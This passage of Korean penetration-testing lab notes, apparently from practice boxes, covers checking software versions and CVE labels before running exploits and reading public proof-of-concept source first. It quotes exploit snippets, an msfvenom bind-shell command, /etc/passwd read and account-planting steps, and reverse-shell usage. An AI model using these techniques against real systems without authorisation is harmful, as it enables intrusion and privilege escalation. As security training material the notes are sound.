**비동기 작업 API 는 「접수」와 「실행」이 분리돼 있음 — 「예약됨」은 성공이 아님.** [[Twiggy]] — SaltStack CVE-2020-11651 PoC(`jasperla/CVE-2020-11651-poc`)의 `--exec` 는 서버가 `jid`(작업 ID)를 돌려주기만 하면 성공을 찍음:
```python
    if rets.get('jid'):
        print('[+] Successfully scheduled job: {}'.format(rets['jid']))
```
— 출처: `~/PG/Twiggy/CVE-2020-11651-poc/exploit.py` 259~260행(2026-08-26 Kali 에서 재확인)

`jid` 는 «작업 ID 를 발급받았다»는 뜻일 뿐이고 runner 는 비동기라 실행 결과가 나중에 job cache 로 들어감 — 명령이 돌았는지·성공했는지는 응답에 **아예 담기지 않음.** 리스너에 30초 넘게 아무것도 안 와서 알아챘음(성공 메시지가 아니라 리스너를 봤기 때문에 오래 안 헤맴).
→ **셸이 안 붙으면 셸을 고치려 들지 말고 «원시(primitive)»를 갈아탈 것.** 이 박스는 `--exec` RCE 를 포기하고 같은 PoC 의 `--upload-src`/`--upload-dest`(임의 파일 쓰기, **동기 호출이라 서버 응답을 즉시 받음**)로 전환해 `/etc/passwd` 에 UID 0 계정을 심는 경로로 성공했음(B-1-48 · B-3-17).
→ 같은 구조 — 메시지 큐·잡 스케줄러·CI 트리거·`at`/`cron` 등록은 전부 「접수 응답」과 「실행 결과」가 **다른 채널**임. 「작업이 예약되었다」 ≠ 「명령이 실행되었다」.

#### A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다

**버전 확인은 10초, 아끼는 시간은 수십 분** — `--version`·`dpkg -l`·배너로 취약 범위와 대조할 것. 버전 정보는 **메일 헤더·HTTP 헤더·에러 페이지** 같은 예상 밖의 곳에 있음.

| 실측 사례 | 무엇이 틀렸나 |
|---|---|
| [[plum]] | SUID `exim4` 를 보고 CVE-2019-10149(4.87–4.91)를 확보했으나 타겟은 **4.94.2** 로 애초에 취약하지 않았음 |
| [[Flu]] | searchsploit 제목 `Confluence < 8.5.3` 이 실제로는 **8.0 이상 전용**이었음. `head -10` 이면 반증됨 |
| [[Clue]] | Samba 4.9.5 는 CVE-2021-44142 범위 안이었으나 `vfs_fruit`+`fruit:metadata=netatalk`+실재 공유가 전부 필요했음 — **버전이 맞아도 설정 게이트가 있음** |

**[[Clue]] 상세 — 「설정 게이트가 있는 CVE」의 표본.** CVE-2021-44142 는 Samba `vfs_fruit`(macOS/Time Machine 호환) 모듈이 확장 속성(EA)의 AppleDouble 메타데이터를 파싱할 때 `(entry_id, offset, length)` 3연조의 offset/length 를 검증 없이 신뢰해 생기는 힙 경계 밖 읽기/쓰기임(Pwn2Own Austin 2021). 읽는 통로는 NTFS 대체 데이터 스트림(`파일명:AFP_AfpInfo`).

| 항목 | 어드바이저리 | Clue 실제 |
|---|---|---|
| 영향 버전 | 4.13.17 미만 전부 | `Samba 4.9.5-Debian` → **범위 안** |
| 필수 설정 | `vfs_fruit` 로드 + `fruit:metadata=netatalk` 또는 `fruit:resource=file` | **확인 불가** |
| 필요 권한 | EA 쓰기 가능 사용자(guest 포함 가능) | 불명 |
| 대상 공유 | 실재하는 공유 이름 | `TimeMachineBackup` 은 이 박스에 없음(실제 공유는 `backup`) — README 예시를 그대로 복사한 것(A-14) |

`fruit:metadata=netatalk` 가 전제인 이유 — 그 값이라야 메타데이터를 Netatalk 호환 AppleDouble 블롭으로 저장해 **취약 파서를 태움.** `stream` 이면 애초에 AppleDouble 을 파싱하지 않아 취약 코드에 도달하지 않음.
`[가정]` Debian 기본 `smb.conf` 는 `vfs objects` 에 `fruit` 을 넣지 않는 옵트인 모듈이라 **공유 이름이 맞았어도 실패했을 것**임 — 타겟 정지로 미확인.
⚠️ **이 시도의 화면 출력은 남아 있지 않음.** `check_vulnerable.py` 1회 실행의 흔적은 `~/PG/Clue/CVE-2021-44142/__pycache__` mtime 뿐임 — clone 완료 `2026-06-16 10:27:46` → `__pycache__` `10:31:25`(3분 39초 뒤, 그 이후 활동 없음). 위 표는 PoC 소스와 Samba 어드바이저리에서 재구성한 것이고 **이 박스에서 관측된 출력이 아님**(A-64).
→ **일반화 — 「버전이 취약 범위에 든다」는 필요조건이지 충분조건이 아님.** 설정 게이트가 있는 CVE 는 **게이트부터 확인**할 것. 확인 비용이 익스플로잇 시도 비용보다 쌈.

**공개 익스플로잇의 CVE 표기도 검증할 것** — 저자가 붙인 참조일 뿐 벤더·NVD 판정이 아님. **"어느 파일 / 어느 기능 / 어느 권한"** 이 내가 한 것과 일치하는지 NVD 원문과 대조할 것.
- [[plum]] — README 는 CVE-2022-25018 을 인용하지만 실제 악용 경로는 **CVE-2024-48138** 이었음
- [[Flu]] — `through_the_wire.py` 헤더는 `CVE-2022-26123`, 배너는 `CVE-2022-26134` 로 **파일 안에서 모순**
- [[Mice]] — Remote Mouse 에 붙이기 쉬운 `CVE-2021-43326` 은 **전혀 다른 제품**(Automox Agent 임시 디렉터리 권한). 실제 대응은 `EDB 46697` ↔ `CVE-2022-3365`(msf 모듈 References 가 둘을 나란히 달아 확정됨). **NVD 에서 제품명이 나오는지 보는 데 10초면 됨**

**CVE 가 버전 대역에 맞아도 «그 코드 경로가 그 버전에 존재하는지» 별도 확인할 것.** [[Cobbles]] — ZoneMinder 1.34.x 면 CVE-2023-26035(`?view=snapshot` 미인증 RCE, msf `zoneminder_snapshots`)가 먼저 떠오르나 **1.34.23 에는 snapshot 뷰가 없어 불발**(`views/` 에 `snapshot.php` 부재, `POST view=snapshot` 은 Content-Length 0). 초기 443 리버스셸 시도가 이 **존재하지 않는 뷰**를 향해 나가 아무것도 실행되지 않았고, 그래서 한동안 「egress 차단」으로 오진했음. 실제 sink 는 Filter `AutoExecuteCmd` 였음(B-1-10).

**관리 패널을 만나면 반사 순서가 정해져 있음 — 「제품명 → 버전 근거 2개 → 인증 후 CVE」.**
1. 로그인 화면에서 **제품명** 확정(타이틀·쿠키명·로고)
2. **버전 근거 2개** — 정적 자산의 `?ver=` 쿼리스트링 · 인증 후 대시보드/about 의 버전 문자열
3. 그 버전으로 **인증 후 RCE CVE** 를 특정

[[CVE-2023-46818]] — `ispconfig.css?ver=3.2`(로그인 HTML) + 대시보드 `3.2.2` → CVE-2023-46818(3.2.11p1 미만). **「기본 자격증명 → 특정 버전의 인증 후 RCE」는 OSCP 전형**이고 변형은 패널 종류만 바뀜(Wordpress·Grafana·GLPI 등).

**`dpkg -l`/`apt` 버전과 «실제로 도는 바이너리» 버전이 다를 수 있음 — 소스 빌드가 `/usr/local` 에 얹혀 있는 경우.** [[ClamAV]] 실측:
```text
ii  clamav         0.84-2.sarge.1 antivirus scanner for Unix
root      3778  0.0 11.0 71396 28344 ?       Ss   05:19   0:00 /usr/local/sbin/c
lamav-milter --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
ClamAV version 0.91, clamav-milter version 0.91
```
— 출처: `~/PG/ClamAV/shell_session.log`

패키지는 **0.84**, 실행 중인 것은 `/usr/local/sbin/clamav-milter` = **0.91**. CVE-2007-4560 의 취약 범위는 `before 0.91.2` 라 **`dpkg` 만 봤으면 「0.84 는 범위 밖」으로 잘못 배제**했을 자리.
→ **`ps aux` 로 실행 «경로»를 보고 그 바이너리에 `--version` 을 물을 것.** 버전 판정 독립 근거 2개 원칙([[Hub]]·[[Levram]]·[[Squid]])의 리눅스 데몬 판.

**배너를 못 믿겠으면 traceback 을 버전 지문으로 쓸 것.** `Server:` 헤더는 위조·생략이 쉬운 반면 traceback·스택트레이스·디버그 페이지는 **실제 실행 중인 코드에서 나오므로** 위조가 사실상 없음. 특히 Python traceback 은 **파일 경로 + 행 번호 + 그 행의 소스 텍스트**를 함께 주므로 사실상 지문임.
1. 존재하지 않는 파라미터·잘못된 타입·빈 값으로 일부러 500 을 유도
2. 노출된 파일 경로·행 번호·소스 텍스트를 기록
3. PyPI/npm/Maven 에서 후보 버전 소스를 받아 같은 행을 대조

Java 스택트레이스 · Rails `.rb:행번호` · PHP `Fatal error … on line N` 전부 같은 방식임.

⛔ **멈추는 기준이 절반임.** 세부 버전이 필요한 경우는 둘뿐 — ①특정 패치 버전에서만 통하는 공개 익스플로잇을 쓸 때 ②보고서에 CVE 를 매핑해야 할 때. 둘 다 아니면 좁히기를 멈출 것. 그리고 **못 좁힌 사실은 「미확정」으로 남길 것** — 나중에 확정값으로 잘못 기억하는 것보다 나음.
— [[Muddy]] 의 Ladon 은 traceback 으로 부류(Python 2.7 `xml.sax`)까지는 좁혔으나 **패치 버전은 끝내 미확정**이었고, 익스플로잇에 영향이 없어 거기서 멈춘 것이 옳았음. ⚠️ 그 박스에서 「후보 버전 소스를 실제로 내려받아 대조했다」는 서술은 **산출물이 없어 근거부족**임 — 위 3단계는 일반 절차로 읽을 것.

⚠️ **「제품 버전을 확정했다」와 「익스플로잇 목록에서 하나만 경로가 맞았다」는 다름.** 후자는 근거 1개이고, 그 익스플로잇이 통했다는 **사후 결과로 자기를 증명할 뿐**임.
[[Codo]] — 타겟에서 CodoForum 버전 문자열을 **한 번도 읽지 못했음.** `searchsploit codo` 8건 중 로고 업로드 → `sites/default/assets/img/attachments/` 경로와 맞는 것이 `CodoForum v5.1 - Remote Code Execution` 하나뿐이라 그것을 골랐고 실제로 통했음. **결과적으로 맞았지만 절차로는 근거 1개짜리** — 안 통했으면 다음 수가 없었음.
→ 웹루트 `sites/default/` 에 `readme.txt` 가 실재했음(셸 획득 후 `ls` 로 확인). 웹에서도 노출됐을 가능성이 높고 그랬다면 스캔 직후 1분 안에 버전이 나왔음 — **시도한 기록 없음** `[가정]`.
→ **버전을 뽑는 독립 경로** — `<meta generator>` · 정적 자원의 `?v=` 쿼리 · `readme.txt` · `CHANGELOG.txt` · `config.php.example` 존재 여부 · 인증 후 대시보드/about(B-1-29).

**화면 버전과 패키지 버전의 «표기법»이 다르면 판정이 애초에 불가능함 — 그때는 그냥 쏠 것.** [[pyLoader]] — 웹UI 정보 페이지는 `0.5.0` 이라고만 보여주는데 PyPI 실제 버전은 `0.5.0b3.dev31` 같은 **PEP 440 개발 릴리스** 표기임. `dev30` 이면 취약하고 `dev31` 이면 안전인데 **화면은 둘 다 `0.5.0`** 이라 화면만으로는 취약 여부를 못 가림.
→ **판정 비용이 시도 비용보다 크면 그냥 시도할 것.** 이 CVE 의 페이로드는 `curl` 한 줄이라 3초면 결론이 남. 반대로 시도가 파괴적이거나 한 발뿐이면(B-24 커널 익스플로잇) 판정을 끝까지 밀어야 함.

⚠️ **GitHub 릴리스 태그가 최신 버전이 아님.** pyLoad 저장소의 최신 태그는 `v0.4.20`(2020)이고 0.5.x 는 **태그도 릴리스도 없이 PyPI 로만** 나갔음. 「GitHub 최신이 0.4.20 이니 0.5.0 은 없다」로 판단하면 틀림 — **배포 채널(PyPI·npm·apt·docker)의 버전 목록을 따로 볼 것.**

**코어 버전과 플러그인 버전은 «별개»로 판정할 것.** [[Astronaut]] — Grav 는 코어(`grav`)와 관리자 플러그인(`grav-plugin-admin`)이 독립 릴리스이고 **CVE-2021-21425 는 플러그인 쪽** 결함임. 코어 1.7.8 만 보고 취약·안전을 판단하면 틀림. **CVE 가 어느 컴포넌트에 붙어 있는지 먼저 읽고 그 컴포넌트의 버전을 찾을 것.** 같은 함정 — WordPress 코어 vs 플러그인, Jenkins 코어 vs 플러그인, Confluence vs 매크로.

**정적 자산의 콘텐츠 해시를 업스트림 git blob 과 대조하면 버전이 확정됨.** git blob 해시는 `sha1("blob <길이>\0" + 내용)` 이라 **로컬에서 `git hash-object` 로 그대로 재계산됨** — clone 없이 GitHub tree API 의 `sha` 와 바로 비교 가능함.
```bash
git hash-object template.css admin.min.js installed.json
```
[[Astronaut]] 실측(`~/PG/Astronaut/tree_1.10.6.json` · `tree_1.10.7.json`) — `template.css`(271946B) · `vendor/composer/installed.json`(9800B)이 **1.10.7 blob 과 정확히 일치**하고 1.10.6 과는 불일치. 반면 `admin.min.js` 는 두 버전이 **동일 blob** 이라 못 가름 — **버전마다 안 바뀌는 자산은 판별자가 아님.**

**GitHub Releases 의 `published_at` 은 태그 커밋 날짜가 아님 — 시간순 추론이 통째로 뒤집힘.** [[Astronaut]] — Releases API 가 admin 1.10.7 을 2021-03-19 로 표시해 코어 1.7.8(03-17)보다 늦어 보였고, 그대로 믿으면 「1.7.8 번들에 1.10.7 이 들어 있을 리 없다 → 판정이 틀렸다」는 오결론이 나옴. 실제 태그 커밋은 **플러그인이 89초 «먼저»** 였음(`grav-plugin-admin 1.10.7` 17:43:19Z · `grav 1.7.8` 17:44:48Z). 확인은 30초임:
```bash
curl -s https://api.github.com/repos/<org>/<repo>/git/ref/tags/<tag>
curl -s https://api.github.com/repos/<org>/<repo>/git/tags/<object.sha>
```
두 번째 응답의 `tagger.date` 가 진짜 날짜임.

**증거끼리 충돌하면 신뢰도 서열로 자를 것** — `git 태그·커밋 날짜 > 파일시스템 mtime > 릴리스 페이지 published_at > 블로그·기사 날짜`. 일반화하면 **콘텐츠 해시(변조 불가) > 파일 메타데이터 > 릴리스 메타데이터(사후 편집 가능)** 이고, **런타임 증거(예외·스택 프레임) > 파일 메타데이터 > 타임스탬프 정황** 도 같은 축임.

⛔ **여러 근거가 «일치»하는 것은 신뢰의 근거가 아님 — 생성 «경로»가 다른 근거가 일치해야 독립임.** [[Hub]] — `readme.txt`(`Changes for 8.0 July 2019`) · SSL 인증서 `Not valid before: 2019-07-16` · 8082 인덱스 `Last-Modified: 2019-07-19` 셋이 일치해 「8.0 확실」로 결론냈으나 **셋 다 「2019년 배포 아카이브」라는 단일 출처**였고 실행 버전은 `/rtl/about.lsp` 가 렌더한 **8.4** 였음. 각 근거에 30초 반사 3문항:
1. **누가 언제 만든 값인가** — 빌드 시점이면 정적, 요청 시점이면 동적
2. **같은 파일·아카이브에서 나왔나** — 그러면 근거는 1개임
3. **업그레이드 때 갱신되나** — `readme`·인증서·정적 파일 mtime 은 최하위

⚠️ **favicon·로고 해시 비교는 「다르면 다르다」만 말함.** 「같으면 같다」는 성립하지 않음 — [[Hub]] 는 8.0 과 8.4 의 자산이 바이트 동일이라 무용지물이었음.
⛔ **그리고 근거 3개는 사치임.** 시험장 기준으로는 **2개면 충분**하고 나머지는 익스가 실패했을 때 돌아와서 하면 됨(D 절).


**버전 번호 자체가 「이미 패치됨」을 말해주는 경우가 있음.** [[plum]] 의 `4.94.2` 는 2021-05-04 공개된 **21Nails 묶음**(CVE-2020-28007~28026 + CVE-2021-27216, 21건)의 수정 릴리스임. 그러므로 이 숫자를 보면 CVE-2019-10149 도 21Nails 도 **둘 다** 배제해야 함 — 「최근에 패치된 버전」이라는 신호임.
⚠️ **번호가 그럴듯하게 들어맞는다고 아무 문서나 출처로 붙이지 말 것.** 21Nails 어드바이저리(`21nails.txt`)는 `4.94.2` 를 **단 한 번도 언급하지 않음**(`grep -c "4\.94\.2" 21nails.txt` → 0). 어드바이저리가 정하는 것은 CRD 2021-05-04 까지이고 어떤 릴리스 번호로 나갔는지는 별도 사료가 필요함 — ftp.exim.org 의 `exim-4.94.2.tar.xz  04-May-2021 13:35`(CRD 와 같은 날)과 4.94.2 태그 `doc/doc-txt/ChangeLog` 의 `Exim version 4.94.2` 절이 그것임. **검증자는 `grep` 한 번으로 확인함.**
**10초짜리 확인이 5분과 오판을 없앰:**
```bash
<바이너리> --version | head -1
dpkg -l | grep <패키지>          # Debian/Ubuntu
rpm -qa | grep <패키지>          # RHEL 계열
```
**버전 정보는 예상 밖의 곳에 있음** — 메일 헤더(`Received: from root by localhost with local (Exim 4.94.2)`)·HTTP 응답 헤더·에러 페이지·`--version`·패키지 DB·`/usr/share/doc/<pkg>/changelog.Debian.gz`. [[plum]] 은 메일함을 열었을 때 **자격증명과 exim 버전이 같은 파일에** 있었음.
**[가정]** 4.94.2 에 남아 있는 공개 로컬 권한상승 경로는 2026-07 공개된 CVE-2026-66140/66141(`< 4.99.5`)뿐이고, 이 박스 스냅샷 시점에 공개 PoC 가 가용했는지는 미확인임.


**익스플로잇 «제목»의 숫자는 타겟 버전이 아니라 취약 상한선임.** [[Algernon]] — EDB 49216 의 제목은 `SmarterMail Build 6985 - Remote Code Execution` 이고 헤더는 `SmarterMail before build 6985` 임. 사전 정보를 쓴 사람이 그 6985 를 **타겟 빌드로 옮겨 적었고**, 실제 빌드는 **6919** 였음.
- 6985 를 믿었으면 「패치 버전인데 왜 취약하지?」로 익스플로잇을 불신하거나, 6919 를 발견한 뒤 「6985 가 아니네, 다른 CVE 인가?」로 재조사에 들어갔을 것임
- `searchsploit` 제목의 숫자는 대부분 「이 버전 «이하»가 취약」을 뜻함. **제목이 아니라 파일 헤더 주석을 읽을 것**(A-14)
- **남이 알려준 버전은 근거 0개임** — 브리핑·팀원 메모·문제 설명 전부 출발점이지 사실이 아님

**패치가 「엔드포인트 제거」가 아니라 「바인딩 축소」인 경우가 있음 — 그러면 로컬 벡터로는 살아 있음.** SmarterMail 빌드 6985 의 패치는 17001 을 없앤 것이 아니라 **`127.0.0.1` 로만 바인딩**한 것임(출처: Metasploit `exploits/windows/http/smartermail_rce.rb` 모듈 설명 — *"the 17001 port is no longer publicly accessible, although it can be accessible locally at 127.0.0.1:17001. Hence, this would still allow for a privilege escalation vector"*). **패치 버전이라는 이유로 그 서비스를 권한상승 후보에서 빼지 말 것.**

#### A-14. 공개 PoC는 실행 전에 소스를 읽는다

**주석·`--help`·예시가 공짜 정찰 정보임.** 고쳐 쓰면 주석까지 고칠 것.

- [[Clue]] — 자격증명 채굴 아이디어가 저자 주석에 적혀 있었음. 하드코딩 비밀번호를 고쳤더니 `# default password for FreeSWITCH` 주석이 **거짓말로 남았음**
- [[Clue]] — README 예시의 인자를 그대로 복사하지 말 것. 공유 이름 `TimeMachineBackup` 은 저자 장비의 것이었음

⚠️ **「열어봤다」는 것만으로는 부족함 — 열 때 «무엇을 볼지»를 정해둘 것.** [[Cockpit]] 실측: `~/.zsh_history` 에 `vi 49390.txt` 가 남아 있는데도 그 직후 확장자를 `.py` 로 바꿔 `python` → `python2` → 인자 붙여 **세 번 실행을 시도**했음. `49390.txt` 는 실행 코드가 아니라 **산문 어드바이저리**였고, 제품도 다른 것(Cockpit CMS)이었음.
```text
searchsploit Cockpit
searchsploit -m 49390
vi 49390.txt
mv 49390.txt 49390.py
python 49390.py
python2 49390.py
python 49390.py 192.168.150.10
vi 49390.py
```
— 출처: `~/.zsh_history` 1170~1177행(대화형 세션, 타임스탬프 없음). `49390.py` mtime 은 2026-06-25 10:41:02 — history 순서만으로 nmap 과의 선후는 확정 불가하고, 「10:41 까지 이 파일을 붙들고 있었다」까지만 확실함.
→ **첫 20줄에서 확인할 것 셋을 고정** — ①제품 식별 줄 ②대상 버전 ③실행 가능한 코드인가(`import`·`#!` 존재 여부). 하나라도 안 맞으면 그 자리에서 버릴 것. 「exploit-db 에서 받은 건 실행하는 것」이라는 관성이 눈으로 훑고도 놓치게 만듦(A-1-11).

**볼 것에 «네트워크 경로»와 «인자가 실제로 쓰이는가»를 추가할 것** — 제품·버전·실행가능성 다음 순서임. [[Codo]] 의 exploit-db 50978(`CodoForum v5.1 RCE`, CVE-2022-31854)에 셋이 동시에 박혀 있었음:
```python
proxy = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
auth = session.post(loginURL, headers=send_headers, cookies=send_cookies, data=send_creds, proxies=proxy)
exploit = requests.post(globalSettings, headers=send_headers, cookies=send_cookies, data=send_payload, proxies=proxy)
payloadExec = session.get(payloadURL + randomFileName + '.php', proxies=proxy)
```
— 출처: `~/PG/Codo/50978.py`
- **Burp 프록시(`127.0.0.1:8080`) 하드코딩** — 로그인·업로드·실행 세 요청 전부에 붙음. Burp 없이 돌리면 죽음. 반면 `getPHPSESSID()` 의 첫 GET 만 `proxies` 가 없어 **초반은 정상으로 보임** — 실패 지점이 뒤로 밀려 원인 파악이 어려워짐
- **`-u`/`-p` 인자가 무시됨** — `login()` 의 multipart 본문에 `admin`/`admin` 이 **문자열로 박혀** 있어 다른 자격증명을 넣어도 그 값이 안 감
- **`CSRF_token` 이 고정값**(`23cc3019cadb6891ebd896ae9bde3d95`) — 타겟이 토큰을 검증하면 그대로 실패함

[[Codo]] 는 이 PoC 를 **실행기가 아니라 지도로** 썼음 — 세 경로(`/admin/?page=login` · `/admin/index.php?page=config` · `/sites/default/assets/img/attachments/`)와 취약 필드(`forum_logo`)만 취해 브라우저로 수동 업로드함 `[가정]`. 근거 둘 — ① PoC 는 파일명을 소문자 10자 난수로 만드는데 실제 파일명은 `payload.php` 고정 ② PoC 페이로드는 `mkfifo`+`nc` 인데 회수된 셸 배너는 `uname -a` → `w` → `id` 로 pentestmonkey `php-reverse-shell.php` 의 것.
→ **PoC 가 안 도는 것이 「그 취약점이 없다」는 뜻이 아님.** 소스에서 «어느 엔드포인트 / 어느 파라미터 / 어느 저장 경로»만 뽑아 수동 재현하면 됨.

**하드코딩된 «세션 쿠키»는 `requests.Session()` 을 조용히 덮어씀 — 실패가 소리 없이 남.** [[Exfiltrated]] — EDB 49876(Subrion CVE-2018-19422 파이썬 PoC)에 `INTELLI_06c8042c3d=15ajqmku31n5e893djc8k8g7a0` 이 박혀 있었음. `Session()` 은 로그인 응답의 `Set-Cookie` 를 쿠키 자에 담아 이후 요청에 자동으로 싣는데, 코드가 `cookies={'INTELLI_…': '<고정값>'}` 를 **요청 단위로 명시**하면 같은 이름의 죽은 값이 세션 쿠키를 덮어써 **로그인은 성공하는데 업로드만 401/403** 이 됨. 게다가 스크립트 마지막이 `input()` 대화 루프라 비대화식 SSH 실행에서 그대로 멈춤.
→ 대응 — 소스를 읽고 필요한 요청 3개(로그인 → CSRF 토큰 → 업로드)만 `sub_upload.py` 로 직접 재구현. **전체를 디버깅하는 것보다 필요한 요청만 재구현하는 쪽이 압도적으로 짧음.**
→ **실행 전 5초 루틴을 고정할 것** — `grep -nE "(Cookie|token|sessid|192\.168|127\.0\.0\.1|input\()" exploit.py`. 하드코딩 쿠키가 특히 나쁜 이유는 **실패가 조용해서**임 — 로그인 요청은 200 을 받고 세션도 만들어지는데 다음 요청만 권한이 없음. 네트워크 캡처 없이는 원인이 안 보임.

**볼 것 하나 더 — 「이 스크립트가 «성공»을 어떻게 판정하는가」.** 판정 로직이 없으면 그것은 익스플로잇이 아니라 **던지기만 하는 도구**임. [[pyLoader]] 의 exploit-db `51532.py`:
```python
def runExploit(url, cmd):
    endpoint = url + '/flash/addcrypted2'
    ...
    test = requests.post(endpoint, headers={...}, data=payload)
    print('[+] The exploit has be executeded in target machine. ')
```
— 출처: `~/PG/pyLoader/CVE-2023-0297/51532.py`

응답을 `test` 에 담아놓고 **쓰지 않음.** 완전한 블라인드라 명령이 실행됐는지·404 인지·500 인지 구분할 방법이 없고 **항상** 성공 메시지를 찍음. 생존 확인도 미덥지 않음 — `requests.get(url + '/flash/addcrypted2')` 의 `status_code == 200` 을 보는데 그 경로는 **POST 전용 핸들러**라 GET 이면 405 가 나옴 → `[-] Host down!` 이라는 틀린 결론. **살아 있는 타겟을 죽었다고 보고하는 PoC 임.**
→ **판정 근거는 스크립트의 출력이 아니라 리스너임.**

**클론본은 손대기 전에 `git log` 와 `git status --porcelain` 을 볼 것.** [[Crane]] 의 클론본은 `FIX: added auto trigger rev sh` 커밋이 들어간 판본이라 트리거까지 자동이었고, `git status` 가 비어 있어 무수정 실행이었음이 확정됨. **어떤 판본을 돌렸는지가 결과 해석을 바꿈.**

**소스를 열면 그것이 곧 수동 절차임.** [[Crane]] `exploit.py` 를 읽어 복원한 것 — 실제로 보내는 필드 6개(`module`·`action`·`name`·`status`·`schedule_type`·`email_recipients`)와 헤더 둘(`Referer: <host>` · `content-type: application/x-www-form-urlencoded`). `[가정]` 그중 무엇이 «필수»인지는 하나씩 빼서 확인한 적이 없음(타겟 정지) — **수동 재현 시에는 전부 넣고 시작할 것.**
→ **판단할 것은 금지 여부가 아니라 「스크립트가 죽었을 때 이어갈 수 있느냐」임**(E 절). 공개 PoC 는 버전이 조금만 달라도, 폼 필드가 하나만 바뀌어도 **조용히 실패**함.

**확인 목록에 「대상이 하드코딩됐는가」를 추가할 것.** [[MiddlewareBypass]] — EQSTLab/CVE-2025-29927 저장소의 `poc.sh` 원본은 대상이 **Kali 자기 자신**으로 고정돼 있었음. 그대로 돌리면 타겟이 아니라 로컬을 침:
```diff
-curl -v "http://localhost:3000/admin" \
-  -H "Host: localhost:3000"
+curl -v "http://192.168.248.215:3000/admin" \
+  -H "Host: 192.168.248.215:3000"
```
— 출처: `~/PG/MiddlewareBypass/CVE-2025-29927/` 의 `git show HEAD:poc.sh` 와 작업 트리 `git diff`(편집 흔적이 커밋되지 않은 채 그대로 남아 있었음)

`curl`·`requests` 계열 PoC 는 `localhost`·`127.0.0.1`·저자 예시 IP 가 박혀 있는 경우가 흔함 — 위 [[Codo]] 의 Burp 프록시 `127.0.0.1:8080` 하드코딩과 같은 계열임.
⚠️ **exploit-db 의 `.txt` 는 대개 «어드바이저리 산문»이고 PoC 본문이 아님.** 같은 박스의 `52124.txt` 는 메타데이터 헤더 10줄뿐이었고 실제 코드는 링크로만 표기돼 있었음 — 실행 코드는 클론한 저장소 쪽에 있었음(A-1-11).

**시행착오 자체도 재료임** — `~/.zsh_history` 에 남은 순서는 `git clone` → `cd` → `ls` → `chmod poc.sh`(**모드 인자 누락으로 실패**) → `chmod 744 poc.sh` → `poc.sh`(**`./` 없이 실행해 PATH 미포함으로 실패**) → `vi poc.sh`(대상 IP 편집) → `./poc.sh`(성공) → `ssh root@…`. **PoC 를 못 돌리는 원인의 절반은 취약점이 아니라 이런 셸 실수임.**

**볼 것 하나 더 — 「주석에 적힌 도구 명령」은 검증된 명령이 아님.** [[Kevin]] 의 python2 PoC(`Muhammd/HP-Power-Manager`) 주석에 msfvenom 한 줄이 박혀 있었고 그 한 줄에 **결함이 셋** 들어 있었음. 셋 다 그대로 복사돼 실행됐음.
```text
#msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.55 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
```
- **`-e` 가 없음** — `x86/alpha_mixed` 가 인코더로 지정되지 않고 datastore 쓰레기 키로 삼켜짐(B-8-10)
- **`LHOST` 가 무의미** — `shell_bind_tcp` 는 LHOST 를 참조하지 않음. 경고도 없음
- **`\x5` 는 `\x5c` 의 오타** — 한 자리 hex 는 `Rex::Text.dehex` 의 정규식에 매치되지 않아 리터럴 `\`·`x`·`5` 로 남음. 결과적으로 `,`(0x2c)·`;`(0x3b)·`.`(0x2e) 등 **금지했어야 할 바이트가 목록에서 빠지고** 엉뚱한 `0x35`·`0x78` 이 들어감

→ **badchar 정본은 Metasploit 모듈의 `BadChars`** 임. `/usr/share/metasploit-framework/modules/exploits/…/*.rb` 를 직접 열 것 — **모듈을 «읽는 것»은 1대 한정 카드를 소모하지 않음**(E 절).
→ 주석의 명령은 저자가 자기 환경에서 한 번 성공한 기록일 뿐이고, **오타가 박제된 채 수년간 복사됨.**


**⚠️ 저자의 경고가 «README 가 아니라 코드 주석»에만 있을 수 있음.** [[plum]] 의 `pluxml.py` 76행:
```python
    # change reverse shell type and/or bash path as appropriate
```
`README.md` 는 228바이트 4줄이고 리버스셸을 **한 번도 언급하지 않음.** 「저자가 문서에 명시했다」와 「코드를 읽어야만 보인다」는 **실전 함의가 정반대**임 — 경고가 주석에만 있으면 **스크립트를 실행만 하는 사람은 영영 못 봄.**
**읽을 때 확인할 것 셋** — ⑴ 어디로 요청을 보내는가(엔드포인트·메서드) ⑵ **성공을 어떻게 판정하는가**(판정이 없으면 던지기만 하는 도구임) ⑶ 내 쪽 설정이 필요한가(리스너·아웃바운드·경로).
**같은 스크립트 안에서도 줄마다 신뢰도가 다름** — `pluxml.py` 의 `[+] Successfully logged in as: admin` 은 응답 본문에서 `Incorrect login or password` 를 검사한 **실제 판정**이지만, 마지막 줄 `[+] Check your listener...` 는 **아무것도 판정하지 않음**(요청을 보냈다는 사실만). 판정 근거는 리스너 쪽임.
**「고쳤을 것」이라고 추정하지 말고 확인할 것** — [[plum]] 은 `~/.zsh_history` 에 `vi pluxml.py` 가 있어 리버스셸 줄을 손봤을 것으로 보였으나 `git status --porcelain`·`git diff --stat` 이 **둘 다 빈 출력**이었고, `pluxml.py` mtime 은 클론 시각 그대로이며 **디렉터리 mtime 만 9초 뒤로** 갱신돼 있었음(= `vi` 스왑 파일 생성·삭제 흔적, `.gitignore` 의 `*.swp` 와 정합). **읽고 나서 「고칠 필요 없다」고 판단한 것**임.


**「익스플로잇이 실패」하면 먼저 인자가 «실제로 파싱됐는지» 볼 것 — 대시 하나가 빠진다.**
[[Flu]] — `~/.zsh_history` 에 연속된 두 줄로 남아 있음:
```text
python through_the_wire.py --rhost 192.168.103.41 -rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /etc/passwd   ← 실패
python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /etc/passwd  ← 성공
```
같은 파서를 Kali 에서 떼어내 재현한 실제 문구:
```text
usage: argtest.py [-h] --rhost RHOST [--rport RPORT] --lhost LHOST
                  [--lport LPORT] [--protocol PROTOCOL] [--reverse-shell]
                  [--fork-nc] [--nc-path NCPATH] [--read-file READ_FILE]
argtest.py: error: unrecognized arguments: -rport 8090
exit=2
```
— 출처: `/tmp/argtest.py`

**이 오타가 «안전한» 종류인 이유 — 그리고 안 그럴 수도 있었던 이유.** `parse_args()` 가 exit 2 로 죽고 `os.fork()` 도 `requests.get()` 도 그 뒤에 있으므로 **패킷이 한 개도 안 나감.**
